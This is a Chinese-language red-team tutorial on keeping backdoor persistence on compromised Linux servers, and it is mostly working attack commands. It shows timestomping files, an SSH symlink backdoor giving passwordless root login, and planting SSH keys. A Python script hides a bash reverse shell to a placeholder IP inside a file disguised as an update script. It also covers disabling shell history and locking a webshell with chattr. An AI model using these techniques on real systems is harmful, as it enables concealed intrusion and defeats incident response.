## 0x00 前言

大多数人可能更熟悉`windows`的各种后门创建与维持方法，但如果拿到`linux`服务器的话也需要去做一些权限维持的措施来防止后门被轻易发现。

## 0x01 权限维持方法

攻防演练中，蓝队有时会通过文件修改时间来判断文件是否为攻击人员新添加的后门，这时可以通过修改文件最后修改时间来达到隐蔽自己的目的。可以通过命令 `touch -c -t 201604061234 filename` 来修改文件显示的最后修改时间。

### 1.3 SSH软连接后门  

在`sshd`服务配置启用`PAM`认证的前提下，`PAM`配置文件中控制标志为`sufficient`时，只要`pam_rootok`模块检测`uid`为`0（root）`即可成功认证登录。使用命令：`ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31387`

![](../Images/1902296afae2e00b56c8440e35ed7d91.png)

任意可达网络内输入：`ssh root@IP -p 31387` 即可无密码连接`SSH`。

### 1.6 SSH公钥免密登录

客户端本地生成公钥，将公钥上传到服务器，之后即可无密码登录服务器。

*   
*   
*   
*   
*   

```
cd root/.ssh/ ssh-keygen -t rsa # 生成公钥cat id_rsa.pub >> authorized_keys # 加入授权文件chmod 600 ./authorized_keys # 给予权限ssh-copy-id -i /root/.ssh/id_rsa.pub root@服务器IP  #将公钥上传到服务器
```

完成后即可无密码登录服务器。

![](../Images/f32d342b6d22eff42264e677c0676ce1.png)

### 1.7 后门隐藏脚本内容

`cat`命令支持```\r``\f``\n```等换行换页符，通过在命令中穿插这类符号可以达到隐藏脚本真实内容的目的。

通过以下`python`脚本生成一个带反弹`shell`的脚本文件：

*   
*   
*   
*   
*   
*   
*   

```
cmd_h = "bash -i >& /dev/tcp/IP/12345  0>&1" #需要隐藏的脚本内容cmd_v = "系统漏洞更新脚本" #cat命令可视内容
with open("test2.sh", "w") as f:    output = "#!/bin/sh\n"    output += cmd_h + ";" + cmd_v + " #\r" + cmd_v + " " * (len(cmd_h) + 3) + "\n"    f.write(output)
```

接下来使用`cat`命令查看内容：

![](../Images/6418c7e4ad4f9e12fd7d1d3271080d06.png)

执行脚本后，客户端接收到服务器`shell`。

![](../Images/d78279e72f6d0b7bfcc94eb9c995c879.png)

这个方法可以配合修改文件最后修改时间后加入计划任务，可以起到很大程度的迷惑性。

### 1.8 关闭历史操作命令

在系统后门安全排查时，会通过历史命令来溯源到危险文件，可以在拿到服务器`shell`时第一时间关闭历史命令记录来隐蔽自己的各种操作。

*   
*   
*   

```
set +o history #关闭历史记录set -o history #恢复历史记录history | grep "test" #删除包含test的历史记录
```

关闭历史记录后，所有操作不会再记录。

![](../Images/03359ee79c772aaf1309412829f005c0.png)

![](../Images/9e8191bc9a718b3fc7f6cde5fea7f7c6.png)

### 1.9 隐藏脚本权限

通过`chattr`命令可以锁定文件防止`root`用户删除，可以使用此命令进一步保护后门文件。

*   
*   

```
chattr +i shell.jsp #锁定文件chattr -i shell.jsp #解锁文件
```

![](../Images/eddca4ec84b1ed3afcd6df22cb03e2b3.png)

以上几种常见的隐藏方法配合使用，以排查方的视角去修改文件参数，从而达到长时间隐藏文件的效果。
